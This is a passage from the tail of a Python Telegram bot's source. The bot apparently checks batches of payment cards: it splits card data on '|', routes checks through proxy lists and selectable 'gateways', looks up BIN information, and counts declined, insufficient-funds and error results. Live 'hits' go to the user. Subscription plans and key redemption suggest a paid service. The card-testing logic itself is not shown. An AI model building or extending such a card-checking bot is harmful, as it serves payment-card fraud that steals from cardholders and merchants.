        [InlineKeyboardButton(f"🟡 Insufficient: {insufficient}", callback_data="none", style="primary"), InlineKeyboardButton(f"🔴 Declined: {declined}", callback_data="none", style="danger")],
        [InlineKeyboardButton(f"📊 Total: {checked} / {total}", callback_data="none", style="primary"), InlineKeyboardButton(f"⚠️ Error: {errors}", callback_data="none", style="danger")],
        [InlineKeyboardButton(f"🚀 Average Speed: {avg_cpm} CPM", callback_data="none", style="primary")]
    ]
    
    try: await styled_edit(msg_obj, final_text, buttons=fkb)
    except Exception: pass
    
    process_store.pop(uid, None)
    await cleanup_user_http_session(uid)

async def _send_mass_hit(card, status, message, price, gateway, uid, elapsed, bot):
    await asyncio.sleep(HIT_DELAY)
    try:
        bi = await get_bin_info(card.split("|")[0])
        msg = format_card_result(status, card, gateway, message, price, bi, elapsed)
        kb = [[InlineKeyboardButton("Owner", url="https://t.me/Dddadddyttt", style="primary")]]
        await styled_send(bot, uid, msg, buttons=kb, use_gif=True)
    except Exception: pass

async def stop_chk_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    puid = int(query.data.split(":")[1])
    if query.from_user.id != puid and query.from_user.id not in ADMIN_ID: 
        return await query.answer("Not yours!", show_alert=True)
    
    proc = ACTIVE_MTXT_PROCESSES.get(puid)
    if proc:
        proc["stopped"] = True
        for t in proc.get("tasks", []):
            if not t.done(): t.cancel()
    await query.answer("Stopped Immediately!", show_alert=True)

async def empty_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer()

# ====================== MAIN SYSTEM ======================
async def check_sites_loop():
    while True:
        await get_github_sites()
        await asyncio.sleep(600)

async def post_init(app: Application):
    print("🔄 Executing Webhook Killer Protocol...")
    try:
        await app.bot.delete_webhook(drop_pending_updates=True)
        print("✅ Webhook destroyed. Polling path is clear.")
    except Exception as e:
        print(f"⚠️ Webhook note: {e}")
        
    try: await init_db()
    except Exception as e: print(f"❌ DB Error: {e}")
    asyncio.create_task(check_sites_loop())

def main():
    global bot_instance
    application = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
    bot_instance = application.bot
    
    # Handlers
    application.add_handler(CommandHandler(["start", "cmds"], start_cmd))
    application.add_handler(CommandHandler("info", info_cmd))
    application.add_handler(CommandHandler("plan", show_plans))
    application.add_handler(CommandHandler("fb", feedback_cmd))
    application.add_handler(CommandHandler("addpxy", add_proxy_cmd))
    application.add_handler(CommandHandler("proxy", view_proxies))
    application.add_handler(CommandHandler("rmpxy", remove_proxy_cmd))
    application.add_handler(CommandHandler("gen", generate_keys_cmd))
    application.add_handler(CommandHandler("redeem", redeem_key_cmd))
    application.add_handler(CommandHandler("validate", validate_key_cmd))
    application.add_handler(CommandHandler("maint", maint_cmd))
    application.add_handler(CommandHandler("users", admin_users_cmd))
    application.add_handler(CommandHandler("revoke", revoke_plan_cmd))
    
    # Document Handler
    application.add_handler(MessageHandler(filters.Document.MimeType("text/plain"), auto_file_check_cmd))
    
    # Callbacks
    application.add_handler(CallbackQueryHandler(gateway_selection_cb, pattern=r"^gate:"))
    application.add_handler(CallbackQueryHandler(stop_chk_cb, pattern=r"^stop_chk:"))
    application.add_handler(CallbackQueryHandler(plans_cb, pattern=r"^show_plans$"))
    application.add_handler(CallbackQueryHandler(back_start_cb, pattern=r"^back_start$"))
    application.add_handler(CallbackQueryHandler(check_joined_cb, pattern=r"^check_joined$"))
    application.add_handler(CallbackQueryHandler(empty_callback_handler, pattern=r"^none$"))

    print("🔄 Starting VIP System with PTB Native Colors...")
    application.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
